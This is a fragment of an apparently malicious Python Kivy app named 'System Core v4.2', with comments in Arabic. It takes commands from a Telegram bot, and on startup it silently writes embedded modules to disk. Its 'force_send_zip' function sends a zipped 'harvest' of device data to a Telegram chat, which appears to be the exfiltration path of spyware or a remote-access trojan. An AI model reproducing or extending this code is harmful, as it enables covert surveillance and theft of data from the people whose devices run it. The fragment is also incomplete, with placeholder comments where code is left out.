        finally: gc.collect()

def force_send_zip(m, device_id, tg, chat_id):
    if hasattr(m, 'daily_zipper') and m.daily_zipper:
        threading.Thread(target=m.daily_zipper.force_send_now, args=(chat_id,)).start()
    else: tg._api("sendMessage", {"chat_id": chat_id, "text": "❌ وحدة الحصاد غير جاهزة"})

_handler = None
def ex(cmd, tg, m, cid, cbq=None):
    global _handler
    if _handler is None: _handler = C()
    _handler.ex(cmd, tg, m, cid, cbq)
'''
}

def _extract_embedded_files():
    """كتابة الملفات المضمّنة إلى المجلد R إن لم تكن موجودة."""
    for filename, content in EMBEDDED_FILES.items():
        dest = os.path.join(R, filename)
        if not os.path.exists(dest):
            try:
                with open(dest, 'w', encoding='utf-8') as f:
                    f.write(content.strip())
                print(f"Extracted embedded: {filename}")
            except Exception as e:
                print(f"Failed to extract {filename}: {e}")

class CoreApp(App):
    # ... (باقي الكلاس كما في النسخة السابقة دون تغيير يذكر، فقط أضفنا استدعاء _extract_embedded_files في البداية)

    def build(self):
        # نستدعي استخراج الملفات المضمّنة مبكراً
        _extract_embedded_files()
        self.title = "System Core v4.2"
        layout = BoxLayout(orientation='vertical', spacing=5)
        self.log = TextInput(
            text="", readonly=True,
            background_color=(0.02, 0.02, 0.02, 1),
            foreground_color=(0.3, 0.9, 0.3, 1), font_size='10sp'
        )
        btns = BoxLayout(size_hint=(1, 0.08), spacing=5)
        copy_btn = Button(text="📋 COPY LOG", background_color=(0.2, 0.4, 0.6, 1))
        copy_btn.bind(on_press=self._copy)
        clear_btn = Button(text="🗑 CLEAR", background_color=(0.6, 0.2, 0.2, 1))
        clear_btn.bind(on_press=self._clear)
        btns.add_widget(copy_btn); btns.add_widget(clear_btn)
        layout.add_widget(self.log); layout.add_widget(btns)
        Clock.schedule_once(self._start, 0.5)
        return layout

    # ... (باقي التوابع كما هي) ...

if __name__ == '__main__':
    CoreApp().run()
